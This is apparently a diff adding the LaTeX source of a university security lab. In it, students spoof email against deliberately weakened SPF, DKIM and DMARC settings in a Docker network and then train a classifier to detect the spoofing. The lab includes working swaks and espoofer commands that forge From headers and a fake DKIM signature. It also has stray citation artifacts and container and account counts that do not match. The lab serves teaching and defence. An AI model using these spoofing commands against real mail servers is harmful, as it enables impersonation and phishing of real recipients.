@@ -1,0 +1,854 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  Email Spoofing & ML-Based Detection Lab                        %%
+%%  Based on the SEED Labs template by Wenliang Du                 %%
+%%  Creative Commons Attribution-NonCommercial-ShareAlike 4.0      %%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\documentclass[11pt]{article}
+
+%% ── Packages ──────────────────────────────────────────────────────
+\usepackage{geometry}
+% setting the geometry
+\geometry{
+	top=1in,
+	bottom=0.5in,
+	left=0.85in,
+	right=0.85in,
+%	header=0.75in,
+%	footer=0.5in
+}
+
+\usepackage{fancyhdr}
+\usepackage{listings}
+\usepackage{enumitem}
+\usepackage{hyperref}
+\usepackage{xcolor}
+\usepackage{graphicx}
+\usepackage{titlesec}
+\usepackage{parskip}
+\usepackage{booktabs}
+\usepackage{caption}
+\usepackage{mdframed}
+\usepackage{minted}
+\usepackage{setspace}
+\usepackage{tabularx}
+\usepackage{array}
+
+%% ── Listings style (monospaced code boxes) ────────────────────────
+\lstset{
+  basicstyle=\ttfamily\small,
+  backgroundcolor=\color{gray!10},
+  frame=single,
+  framerule=0.4pt,
+  rulecolor=\color{gray!60},
+  breaklines=true,
+  breakatwhitespace=true,
+  showstringspaces=false,
+  tabsize=4,
+  xleftmargin=6pt,
+  xrightmargin=6pt,
+  aboveskip=6pt,
+  belowskip=6pt,
+}
+
+\definecolor{bg}{rgb}{0.95, 0.95, 0.95}
+\usemintedstyle{native}
+\setminted{
+    linenos,
+    frame=none,
+    numbersep=6pt,
+    framesep=2mm,
+    bgcolor=bg,
+    fontsize=\large,
+    xleftmargin=\parindent
+}
+
+%% ── Headers / footers ─────────────────────────────────────────────
+\pagestyle{fancy}
+\fancyhf{}
+\lhead{\bfseries SEED Labs -- Hardening Email Sender Authentication}
+\rhead{\thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+
+%% ── Task counter ──────────────────────────────────────────────────
+\newcounter{task}
+\setcounter{task}{1}
+\newcommand{\tasks}{%
+  \textbf{(\arabic{task})}\addtocounter{task}{1}\,}
+
+%% ── Note / warning box ────────────────────────────────────────────
+\newmdenv[
+  linecolor=orange!70,
+  backgroundcolor=orange!8,
+  linewidth=1pt,
+  innerleftmargin=8pt,
+  innerrightmargin=8pt,
+  innertopmargin=6pt,
+  innerbottommargin=6pt,
+]{notebox}
+
+\newmdenv[
+  linecolor=blue!50,
+  backgroundcolor=blue!5,
+  linewidth=1pt,
+  innerleftmargin=8pt,
+  innerrightmargin=8pt,
+  innertopmargin=6pt,
+  innerbottommargin=6pt,
+]{infobox}
+
+%% ══════════════════════════════════════════════════════════════════
+\begin{document}
+%% ══════════════════════════════════════════════════════════════════
+
+\begin{center}
+  {\LARGE\bfseries Hardening Email Sender Authentication}\\[6pt]
+  {\large Exploiting SPF, DKIM, and DMARC --- and Building a Defence}
+\end{center}
+
+\vspace{4pt}
+\noindent\rule{\linewidth}{0.6pt}
+\vspace{4pt}
+
+\noindent
+Copyright \textcopyright{} 2026.
+This lab is released under the
+\href{http://creativecommons.org/licenses/by-nc-sa/4.0/}{Creative
+Commons Attribution-NonCommercial-ShareAlike 4.0 International License}.
+
+\vspace{8pt}
+
+%% ══════════════════════════════════════════════════════════════════
+\section{Overview}
+%% ══════════════════════════════════════════════════════════════════
+
+Email remains one of the most widely abused communication channels for
+impersonation and phishing attacks.
+Over the last two decades, three authentication protocols have been
+standardised to combat email sender spoofing:
+\textbf{SPF} (Sender Policy Framework),
+\textbf{DKIM} (DomainKeys Identified Mail), and
+\textbf{DMARC} (Domain-based Message Authentication, Reporting and
+Conformance).
+Despite their widespread adoption, real-world deployments are riddled
+with misconfigurations and implementation weaknesses that allow a
+determined attacker to bypass all three layers simultaneously.
+
+This lab has two complementary objectives:
+
+\begin{enumerate}[noitemsep]
+  \item \textbf{Attack.} Students will exploit deliberate
+    misconfigurations in a controlled email infrastructure to deliver
+    spoofed messages that pass (or are not rejected by) SPF, DKIM, and
+    DMARC checks.
+  \item \textbf{Defend.} Students will train and evaluate a
+    machine-learning classifier that analyses email headers and metadata
+    to flag spoofed messages, providing a last line of defence when
+    protocol-level checks fail.
+\end{enumerate}
+
+\paragraph{Topics covered.}
+\begin{itemize}[noitemsep]
+  \item How SPF, DKIM, and DMARC work and interact
+  \item Common misconfigurations that enable spoofing (soft-fail SPF,
+    missing DKIM, DMARC \texttt{p=none})
+  \item Direct MTA attacks using \texttt{swaks} and \texttt{espoofer}
+  \item Header-injection and envelope/header \texttt{From} mismatch
+    attacks
+  \item Feature engineering from email headers for ML-based detection
+  \item Evaluating a classifier against known spoofing patterns
+\end{itemize}
+
+\paragraph{Readings.}
+\begin{itemize}[noitemsep]
+  \item RFC 7208 (SPF), RFC 6376 (DKIM), RFC 7489 (DMARC)
+  \item J.\ Chen, V.\ Paxson, J.\ Jiang ---
+    \textit{Composition Kills: A Case Study of Email Sender
+    Authentication}, USENIX Security 2020
+    (included in \texttt{containers\_setup/espoofer/papers/})
+  \item \url{https://github.com/chenjj/espoofer} --- \texttt{espoofer} tool
+    documentation
+\end{itemize}
+
+\paragraph{Lab Environment.}
+All tasks run inside a Docker Compose network (\texttt{net-10.9.0.0/24})
+that you will set up using the provided scripts.
+No external Internet access is required for the attack tasks.
+A host machine with Docker and Docker Compose installed is sufficient.
+This lab has been developed and tested on the official SEED Labs
+Ubuntu~20.04 virtual machine.
+
+%% ══════════════════════════════════════════════════════════════════
+\section{Lab Environment}
+%% ══════════════════════════════════════════════════════════════════
+
+\subsection{Container Architecture}
+
+The lab uses four containers connected on the \texttt{10.9.0.0/24}
+subnet.
+Table~\ref{tab:containers} summarises each container's role.
+
+\begin{table}[h]
+\centering
+\caption{Docker containers and their roles}
+\label{tab:containers}
+\begin{tabularx}{\textwidth}{@{} l l l >{\raggedright\arraybackslash}X @{}}
+\toprule
+\textbf{Container} & \textbf{IP} & \textbf{Image} & \textbf{Role} \\
+\midrule
+\texttt{dns-server-10.9.0.5}
+  & \texttt{10.9.0.5}
+  & Custom BIND9
+  & Authoritative DNS for both domains \\
+\texttt{victim-mail-10.9.0.6}
+  & \texttt{10.9.0.6}
+  & \texttt{docker-mailserver}
+  & Postfix/Dovecot mail server (\texttt{victim.test}) \\
+\texttt{attacker-sender-10.9.0.7}
+  & \texttt{10.9.0.7}
+  & \texttt{seed-ubuntu:large}
+  & Attack workstation \\
+\bottomrule
+\end{tabularx}
+\end{table}
+
+
+\paragraph{DNS zones.}
+Two DNS zones are served by the BIND9 container:
+
+\begin{itemize}[noitemsep]
+  \item \textbf{\texttt{victim.test}} --- the target domain, configured
+    with intentional weaknesses: SPF soft-fail (\texttt{\textasciitilde
+    all}), no DKIM selector published, and DMARC policy
+    \texttt{p=none} (monitoring only).
+  \item \textbf{\texttt{attacker.test}} --- the attacker's domain, with
+    a valid SPF record authorising \texttt{10.9.0.7}, a DKIM public key,
+    and a permissive DMARC record.
+\end{itemize}
+
+\paragraph{Mail accounts.}
+The victim mail server hosts two accounts:
+\begin{listing}[H]
+\begin{minted}{text}
+alice@victim.test   password: pass123
+bob@victim.test     password: 123pass
+user@victim.test    (hashed, for postfix-accounts.cf)
+\end{minted}
+\end{listing}
+
+\begin{listing}[H]
+\begin{minted}{text}
+# Exposed ports (host machine)
+SMTP:  localhost:2525  ->  victim-mail:25
+IMAP:  localhost:1143  ->  victim-mail:143
+\end{minted}
+\end{listing}
+
+\subsection{Setup and Commands}
+
+\paragraph{Step 1 --- Start the containers.}
+From the root of the \texttt{containers\_setup} directory:
+
+\begin{listing}[H]
+\begin{minted}{text}
+$ dcdown          # to bring down running containers, if needed
+$ dcup -d                    
+$ dockps          # verify all three containers are running
+\end{minted}
+\end{listing}
+
+\paragraph{Step 2 --- Run the first-time initialisation script.}
+Open a shell inside the attacker container and run the setup script
+\emph{once}:
+
+\begin{listing}[H]
+\begin{minted}{text}
+$ docksh attacker-sender-10.9.0.7
+(attacker)$ cd /home/seed/init_setup
+(attacker)$ bash run-me-1st.sh
+\end{minted}
+\end{listing}
+
+This script updates the system, installs \texttt{swaks}, and installs
+the Python dependencies required by \texttt{espoofer}.
+
+\paragraph{Step 3 --- Verify DNS resolution.}
+Still inside the attacker container, confirm that the custom DNS server
+is resolving both zones correctly:
+
+\begin{listing}[H]
+\begin{minted}{text}
+(attacker)$ dig MX victim.test @10.9.0.5
+(attacker)$ dig TXT victim.test @10.9.0.5
+(attacker)$ dig TXT _dmarc.victim.test @10.9.0.5
+\end{minted}
+\end{listing}
+
+\begin{listing}[H]
+\begin{minted}{text}
+$ dcdown # stops the containers
+\end{minted}    
+
+\end{listing}
+
+%% ══════════════════════════════════════════════════════════════════
+\section{Task 1: Per-Protocol Configurations and \texttt{swaks} Attacks}
+%% ══════════════════════════════════════════════════════════════════
+
+The sender-authentication behaviour for \texttt{victim.test} is
+controlled by DNS records defined in the BIND zone file \texttt{containers\_setup/bind/zones/db.victim.test}.
+
+
+By commenting and uncommenting specific lines in this file, we can
+simulate four different deployment scenarios:
+
+\begin{enumerate}[noitemsep]
+  \item no sender authentication at all,
+  \item SPF only,
+  \item DKIM only,
+  \item DMARC only.
+\end{enumerate}
+
+In each sub-task below, you will:
+
+\begin{itemize}[noitemsep]
+  \item edit \texttt{db.victim.test} to obtain the desired configuration,
+  \item reload the DNS server and verify the records using \texttt{dig},
+  \item craft a \texttt{swaks} command that sends a spoofed email under
+        that configuration,
+  \item retrieve the message and analyse the authentication-related
+        headers.
+\end{itemize}
+
+You should both run the commands directly in the shell and encode your
+final attack commands into the provided
+\texttt{/home/seed/attacks/attack.sh} script so that you can easily
+repeat each attack during later tasks.
+
+\subsection{Task 1.1 --- No Authentication}
+
+In this baseline scenario, \texttt{victim.test} publishes \emph{no} SPF,
+DKIM, or DMARC records at all: receivers have no protocol-level
+information about who is allowed to send mail for this domain.[file:4]
+
+\paragraph{Step 1: Disable all authentication records.}
+Open \texttt{db.victim.test} and ensure that the SPF and DMARC lines are
+commented out, and that no DKIM selector records are present, e.g.:
+
+\begin{listing}[H]
+\begin{minted}{text}
+; --- INTENTIONAL MISCONFIGURATIONS (for Task 1.1) ---
+
+; SPF: disabled
+; @       IN  TXT     "v=spf1 mx ~all"
+
+; DKIM: no selector/_domainkey record for victim.test
+
+; DMARC: disabled
+; _dmarc IN TXT "v=DMARC1; p=none; aspf=r; adkim=r"
+\end{minted}
+\end{listing}
+
+Reload the DNS server (using the provided helper script or \texttt{rndc
+reload}) and verify that no SPF or DMARC records exist:
+
+\begin{listing}[H]
+\begin{minted}{text}
+(attacker)$ dig TXT victim.test @10.9.0.5
+(attacker)$ dig TXT _dmarc.victim.test @10.9.0.5
+\end{minted}
+\end{listing}
+
+\paragraph{Step 2: Spoofed email with no authentication.}
+Send a spoofed email that pretends to come from the CEO at
+\texttt{victim.test}:
+
+\begin{listing}[H]
+\begin{minted}{text}
+(attacker)$ swaks \
+  --from attacker@victim.test \
+  --to bob@victim.test \
+  --server 10.9.0.6 --port 25 \
+  --helo attacker.attacker.test \
+  --header "From: CEO <ceo@victim.test>" \
+  --header "Subject: No-auth baseline" \
+  --body "This is a spoofed email with no auth at all."
+\end{minted}
+\end{listing}
+
+Retrieve the message from Bob's inbox (via IMAP) and examine the full
+headers.
+
+\paragraph{Questions.}
+\begin{enumerate}[noitemsep]
+  \item Which, if any, \texttt{Authentication-Results} fields are
+        present (for SPF, DKIM, or DMARC)?
+  \item Does the message reach Bob's inbox? If so, what evidence (if
+        any) would allow a human user or filter to detect spoofing?
+  \item How difficult would it be for an attacker to impersonate other
+        users at \texttt{victim.test} in this configuration?
+\end{enumerate}
+
+\subsection{Task 1.2 --- SPF-Only Deployment}
+
+In this scenario, \texttt{victim.test} publishes an SPF record but no
+DKIM or DMARC records.[file:4]
+
+\paragraph{Step 1: Enable SPF, keep DKIM and DMARC disabled.}
+Edit \texttt{db.victim.test} so that the SPF line is active, while
+DKIM and DMARC remain disabled:
+
+\begin{listing}[H]
+\begin{minted}{text}
+; SPF: enabled (soft-fail policy)
+@       IN  TXT     "v=spf1 mx ~all"
+
+; DKIM: still no selector/_domainkey record for victim.test
+
+; DMARC: disabled
+; _dmarc IN TXT "v=DMARC1; p=none; aspf=r; adkim=r"
+\end{minted}
+\end{listing}
+
+Reload the DNS server and verify:
+
+\begin{listing}[H]
+\begin{minted}{text}
+(attacker)$ dig TXT victim.test @10.9.0.5          # shows SPF
+(attacker)$ dig TXT _dmarc.victim.test @10.9.0.5   # no DMARC record
+\end{minted}
+\end{listing}
+
+\paragraph{Step 2: SPF-based spoofing with envelope/header mismatch.}
+SPF checks the \emph{envelope sender} (SMTP \texttt{MAIL FROM}) and
+ignores the visible \texttt{From:} header.
+Exploit this by using an envelope sender authorised by SPF while
+forging the visible \texttt{From:} address.
+
+\begin{listing}[H]
+\begin{minted}{text}
+(attacker)$ swaks \
+  --from attacker@attacker.test \
+  --to bob@victim.test \
+  --server 10.9.0.6 --port 25 \
+  --helo attacker.test \
+  --header "From: Alice <alice@victim.test>" \
+  --header "Subject: SPF-only bypass" \
+  --body "Hi Bob, this looks like it came from Alice."
+\end{minted}
+\end{listing}
+
+Retrieve the message and inspect the \texttt{Authentication-Results} and
+\texttt{Received-SPF} headers.
+
+\paragraph{Questions.}
+\begin{enumerate}[noitemsep]
+  \item What is the \texttt{spf=} result for this message? Why?
+  \item What domain appears in the visible \texttt{From:} header?
+  \item Does SPF, by itself, prevent Bob from being fooled by this
+        message?
+  \item How would changing the SPF record to use \texttt{-all}
+        (hard-fail) instead of \texttt{\textasciitilde all}
+        (soft-fail) affect this attack?
+\end{enumerate}
+
+\subsection{Task 1.3 --- DKIM-Only Deployment}
+
+In this scenario, \texttt{victim.test} uses DKIM signing but publishes
+no SPF or DMARC records.
+Receivers can, in principle, verify a cryptographic signature on the
+message, but there is no DMARC policy tying that result to enforcement.[file:4]
+
+\paragraph{Step 1: Publish a DKIM key, disable SPF/DMARC.}
+Edit \texttt{db.victim.test} to disable SPF and DMARC while publishing a
+DKIM selector (you may reuse the key generation steps later in the lab):
+
+\begin{listing}[H]
+\begin{minted}{text}
+; SPF: disabled for Task 1.3
+; @       IN  TXT     "v=spf1 mx ~all"
+
+; DKIM: publish a selector for victim.test
+default._domainkey IN TXT "v=DKIM1; k=rsa; p=YOUR_BASE64_PUBLIC_KEY"
+
+; DMARC: disabled for Task 1.3
+; _dmarc IN TXT "v=DMARC1; p=none; aspf=r; adkim=r"
+\end{minted}
+\end{listing}
+
+Reload DNS and verify that the DKIM selector exists:
+
+\begin{listing}[H]
+\begin{minted}{text}
+(attacker)$ dig TXT default._domainkey.victim.test @10.9.0.5
+\end{minted}
+\end{listing}
+
+Configure the victim mail server so that legitimate outbound mail from
+\texttt{victim.test} is signed with the corresponding private key, then
+send a legitimate email from \texttt{alice@victim.test} to
+\texttt{bob@victim.test} and confirm that \texttt{dkim=pass} appears in
+\texttt{Authentication-Results}.
+
+\paragraph{Step 2: Spoofed email with broken DKIM signature.}
+Now craft a spoofed message that carries a syntactically valid but
+cryptographically invalid DKIM signature.
+
+\begin{listing}[H]
+\begin{minted}{text}
+(attacker)$ swaks \
+  --from alice@victim.test \
+  --to bob@victim.test \
+  --server 10.9.0.6 --port 25 \
+  --helo attacker.attacker.test \
+  --header "From: CEO <ceo@victim.test>" \
+  --header "To: Bob <bob@victim.test>" \
+  --header "Subject: DKIM-only bypass" \
+  --header "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; \
+d=victim.test; s=default; h=from:to:subject; \
+bh=invalidhash; b=invaliddata" \
+  --body "Spoofed mail with an invalid DKIM signature."
+\end{minted}
+\end{listing}
+
+\paragraph{Questions.}
+\begin{enumerate}[noitemsep]
+  \item What is the \texttt{dkim=} result for this spoofed message?
+  \item Does the message still reach Bob's inbox? Why might a receiver
+        accept a message with \texttt{dkim=fail}?
+  \item What additional policy or configuration would be required to
+        reject messages with broken DKIM signatures?
+\end{enumerate}
+
+\subsection{Task 1.4 --- DMARC-Only Deployment}
+
+DMARC is designed to enforce \emph{alignment} of authenticated identities
+(from SPF and/or DKIM) with the visible \texttt{From:} domain.
+If a domain publishes DMARC but does not deploy SPF or DKIM, DMARC has
+no underlying authentication results to work with.[file:4]
+
+\paragraph{Step 1: Enable DMARC, disable SPF/DKIM.}
+Configure \texttt{db.victim.test} so that only the DMARC record is
+active:
+
+\begin{listing}[H]
+\begin{minted}{text}
+; SPF: disabled for Task 1.4
+; @       IN  TXT     "v=spf1 mx ~all"
+
+; DKIM: no selector/_domainkey record for victim.test
+; default._domainkey IN TXT "v=DKIM1; k=rsa; p=..."
+
+; DMARC: enabled, but depends on SPF/DKIM results
+_dmarc IN TXT "v=DMARC1; p=none; aspf=r; adkim=r"
+\end{minted}
+\end{listing}
+
+Reload DNS and verify:
+
+\begin{listing}[H]
+\begin{minted}{text}
+(attacker)$ dig TXT victim.test @10.9.0.5          # no SPF
+(attacker)$ dig TXT default._domainkey.victim.test @10.9.0.5  # no DKIM
+(attacker)$ dig TXT _dmarc.victim.test @10.9.0.5   # DMARC present
+\end{minted}
+\end{listing}
+
+\paragraph{Step 2: Spoofed email with DMARC-only configuration.}
+Re-use a simple spoof similar to Task~1.1:
+
+\begin{listing}[H]
+\begin{minted}{text}
+(attacker)$ swaks \
+  --from attacker@victim.test \
+  --to bob@victim.test \
+  --server 10.9.0.6 --port 25 \
+  --helo attacker.attacker.test \
+  --header "From: CEO <ceo@victim.test>" \
+  --header "Subject: DMARC-only bypass" \
+  --body "DMARC is present, but SPF/DKIM are missing."
+\end{minted}
+\end{listing}
+
+\paragraph{Questions.}
+\begin{enumerate}[noitemsep]
+  \item What are the \texttt{spf=}, \texttt{dkim=}, and \texttt{dmarc=}
+        results in the \texttt{Authentication-Results} header?
+  \item Why does DMARC, by itself, not prevent delivery of this spoofed
+        message when SPF and DKIM are absent?
+  \item How would the behaviour change if SPF and/or DKIM were properly
+        deployed and DMARC were set to \texttt{p=quarantine} or
+        \texttt{p=reject}?
+\end{enumerate}
+
+%% ══════════════════════════════════════════════════════════════════
+\section{Task 2: Multi-Layer Bypass with \texttt{espoofer}}
+%% ══════════════════════════════════════════════════════════════════
+
+In Task~1 you exploited each protocol (SPF, DKIM, DMARC) in isolation
+using \texttt{swaks}.
+In this task, you will use the \texttt{espoofer} tool to craft attacks
+that combine multiple bypass techniques and misconfigurations at once.
+
+\subsection{Task 2.1 --- Exploring Available Attack Cases}
+
+\texttt{espoofer} is a research tool that implements a catalogue of
+known email-sender-authentication bypass techniques discovered by Chen,
+Paxson, and Jiang (USENIX Security 2020).
+It operates in three modes: \textit{server}, \textit{client}, and
+\textit{manual}.
+In this lab we use \textit{server} mode, where \texttt{espoofer} acts
+as the sending MTA.
+
+\begin{listing}[H]
+\begin{minted}{text}
+(attacker)$ cd /home/seed/espoofer
+(attacker)$ python3 espoofer.py -l
+\end{minted}
+\end{listing}
+
+This lists all built-in attack cases.
+Note the case identifiers (e.g. \texttt{server\_a1}, \texttt{server\_a2},
+...).
+
+\paragraph{Questions.}
+\begin{enumerate}[noitemsep]
+  \item How many distinct server-mode attack cases are available?
+  \item Pick three cases and describe in your own words what
+        authentication property (SPF, DKIM, DMARC, or their combination)
+        each one exploits.
+\end{enumerate}
+
+\subsection{Task 2.2 --- Configuring \texttt{espoofer}}
+
+Edit \texttt{/home/seed/espoofer/config.py} to target the lab
+infrastructure:
+
+\begin{listing}[H]
+\begin{minted}{text}
+config = {
+  "attacker_site":          b"attacker.test",
+  "legitimate_site_address": b"admin@victim.test",  # spoofed From:
+  "victim_address":         b"bob@victim.test",     # target inbox
+  "case_id":                b"server_a1",          # change to test others
+
+  "server_mode": {
+    "recv_mail_server":      "10.9.0.6",
+    "recv_mail_server_port": 25,
+    "starttls":              False,
+  },
+}
+\end{minted}
+\end{listing}
+
+\subsection{Task 2.3 --- Running Combined Attacks}
+
+Run \texttt{espoofer} using the configured case:
+
+\begin{listing}[H]
+\begin{minted}{text}
+(attacker)$ python3 espoofer.py          # uses config.py settings
+# OR override the case ID on the command line:
+(attacker)$ python3 espoofer.py -id server_a2
+\end{minted}
+\end{listing}
+
+For each chosen case, retrieve the message from Bob's inbox and examine
+the \texttt{Authentication-Results} header.
+
+\paragraph{Questions (repeat for at least 3 different case IDs).}
+\begin{enumerate}[noitemsep]
+  \item For each case, record the \texttt{spf=}, \texttt{dkim=}, and
+        \texttt{dmarc=} results.
+  \item Which cases result in \texttt{dmarc=pass} even when something
+        suspicious is happening with SPF or DKIM?
+  \item What does the \texttt{From:} header look like to Bob in each
+        case?
+  \item Relate each successful case back to the misconfigurations you
+        exploited in Task~1 (SPF, DKIM, and DMARC).
+  \item Explain, in protocol terms, why combining multiple weaknesses
+        (a ``cocktail'' of bypasses) is more effective than any
+        single technique alone.
+\end{enumerate}
+
+%% Optional: keep a short manual-mode exercise, if desired.
+\subsection{Task 2.4 --- Optional: Manual-Mode Attack}
+
+Use manual mode to craft a raw spoofed message with full control over
+every header field:
+
+\begin{listing}[H]
+\begin{minted}{text}
+(attacker)$ python3 espoofer.py -m m \
+  -helo attacker.test \
+  -mfrom attacker@attacker.test \
+  -rcptto bob@victim.test \
+  -ip 10.9.0.6 -port 25 \
+  -data \
+"From: Alice <alice@victim.test>\r\nSubject: Spoofing\r\n\r\nBody here."
+\end{minted}
+\end{listing}
+
+\paragraph{Question.}
+Explain what each flag controls at the SMTP protocol level and how it
+relates to SPF, DKIM, or DMARC verification.
+
+%% ══════════════════════════════════════════════════════════════════
+\section{Task 3: ML-Based Spoofing Detection}
+%% ══════════════════════════════════════════════════════════════════
+
+In this task, you will build and evaluate a machine-learning classifier
+that distinguishes spoofed emails from legitimate ones based on header
+features.
+You will specifically compare how well the classifier performs against
+\emph{single-protocol} bypasses (Task~1) versus \emph{multi-layer}
+\texttt{espoofer} attacks (Task~2).
+
+\subsection{Task 3.1 --- Dataset Preparation}
+
+Collect raw email headers from:
+\begin{itemize}[noitemsep]
+  \item legitimate emails (e.g.\ from Task~1 legitimate tests),
+  \item single-protocol bypass attacks using \texttt{swaks} (Task~1.1--1.3),
+  \item multi-layer bypass attacks using \texttt{espoofer} (Task~2).
+\end{itemize}
+
+For each email, extract features such as:
+\begin{itemize}[noitemsep]
+  \item \texttt{spf\_result} --- encoded as \texttt{pass}, \texttt{softfail},
+        \texttt{fail}, \texttt{none};
+  \item \texttt{dkim\_result} --- \texttt{pass}, \texttt{fail}, \texttt{none};
+  \item \texttt{dmarc\_result} --- \texttt{pass}, \texttt{fail}, \texttt{none};
+  \item \texttt{from\_return\_path\_mismatch} --- Boolean;
+  \item \texttt{helo\_from\_mismatch} --- Boolean;
+  \item \texttt{num\_received\_hops} --- count of \texttt{Received:} headers;
+  \item other header-derived features you consider useful.
+\end{itemize}
+
+You may supplement your lab-generated emails with a public corpus
+(e.g.\ SpamAssassin, CEAS 2008) to increase dataset size and class
+balance.
+
+\paragraph{Feature extraction hint.}
+Python's \texttt{email} library can parse raw messages:
+
+\begin{listing}[H]
+\begin{minted}{text}
+import email
+
+with open("raw_message.eml", "r") as f:
+    msg = email.message_from_file(f)
+
+from_addr     = msg.get("From", "")
+return_path   = msg.get("Return-Path", "")
+auth_results  = msg.get("Authentication-Results", "")
+received_hdrs = msg.get_all("Received", [])
+\end{minted}
+\end{listing}
+
+\subsection{Task 3.2 --- Training a Baseline Classifier}
+
+Train at least one \texttt{scikit-learn} classifier (e.g.\ Random Forest,
+Logistic Regression, SVM) to predict whether an email is \emph{legitimate}
+or \emph{spoofed} based on your feature set.
+
+\begin{listing}[H]
+\begin{minted}{text}
+from sklearn.ensemble import RandomForestClassifier
+from sklearn.model_selection import train_test_split
+from sklearn.metrics import classification_report, confusion_matrix
+
+X_train, X_test, y_train, y_test = train_test_split(
+    X, y, test_size=0.2, random_state=42, stratify=y)
+
+clf = RandomForestClassifier(n_estimators=100, random_state=42)
+clf.fit(X_train, y_train)
+
+y_pred = clf.predict(X_test)
+print(classification_report(y_test, y_pred,
+      target_names=["Legitimate", "Spoofed"]))
+print(confusion_matrix(y_test, y_pred))
+\end{minted}
+\end{listing}
+
+Report precision, recall, F1-score, and accuracy for your classifier.
+
+\subsection{Task 3.3 --- Single vs Multi-Layer Bypass Experiments}
+
+To understand how well your classifier handles different kinds of
+attacks, evaluate it separately on:
+\begin{itemize}[noitemsep]
+  \item the subset of \textbf{single-protocol} bypass emails
+        (Task~1.1--1.3), and
+  \item the subset of \textbf{multi-layer} \texttt{espoofer} emails
+        (Task~2).
+\end{itemize}
+
+Compute and compare metrics (precision, recall, F1-score) for these two
+subsets.
+
+\paragraph{Questions.}
+\begin{enumerate}[noitemsep]
+  \item Is your classifier more effective at detecting single-protocol
+        bypasses or multi-layer \texttt{espoofer} attacks? Explain why.
+  \item Which features appear most important for detecting multi-layer
+        attacks? Does this match your intuition from Tasks~1 and~2?
+  \item Describe at least two ways an attacker could adapt their
+        spoofing strategy to evade your classifier.
+  \item What additional features or data sources would you recommend
+        adding in a production-grade system (e.g.\ content features,
+        sender reputation, behavioural signals)?
+\end{enumerate}
+
+
+
+%% ══════════════════════════════════════════════════════════════════
+\section{Submission}
+%% ══════════════════════════════════════════════════════════════════
+
+Students should submit a lab report in PDF format containing:
+
+\begin{enumerate}[noitemsep]
+  \item \textbf{Environment verification} --- screenshots of running
+    containers (\texttt{docker compose ps}) and successful DNS
+    resolution.
+  \item \textbf{Task answers} --- all numbered questions answered with
+    supporting evidence (terminal output, header excerpts, screenshots).
+  \item \textbf{Attack logs} --- the contents of
+    \texttt{spf-spoof-attack.log} and relevant
+    \texttt{Authentication-Results} headers for at least three
+    \texttt{espoofer} cases.
+  \item \textbf{ML results} --- the full \texttt{classification\_report}
+    output, a confusion matrix, and the feature importance plot (or
+    coefficient table) for your classifier.
+  \item \textbf{Hardening evidence} --- before/after zone file excerpts
+    and re-run attack outputs showing the effect of each hardening step.
+  \item \textbf{Reflection} --- a short paragraph (200--300 words)
+    discussing the limitations of both protocol-level defences and the
+    ML classifier, and what a production-grade solution would look like.
+\end{enumerate}
+
+\begin{notebox}
+\textbf{Academic integrity notice.}
+All attacks in this lab must be conducted exclusively within the
+provided Docker network.
+Do not attempt any of these techniques against real email infrastructure.
+\end{notebox}
+
+
+%% ══════════════════════════════════════════════════════════════════
+\section{Acknowledgements}
+%% ══════════════════════════════════════════════════════════════════
+
+\begin{itemize}[noitemsep]
+  \item The \texttt{espoofer} tool is developed by Jianjun Chen, Vern
+    Paxson, and Jian Jiang and is available at
+    \url{https://github.com/chenjj/espoofer}.
+  \item The container infrastructure (DNS, mail server, and attacker
+    workstation) was developed as part of the course project.
+  \item The lab format is inspired by the SEED Security Lab series
+    by Wenliang Du, Syracuse University
+    (\url{https://seedsecuritylabs.org}).
+\end{itemize}
+
+\end{document}
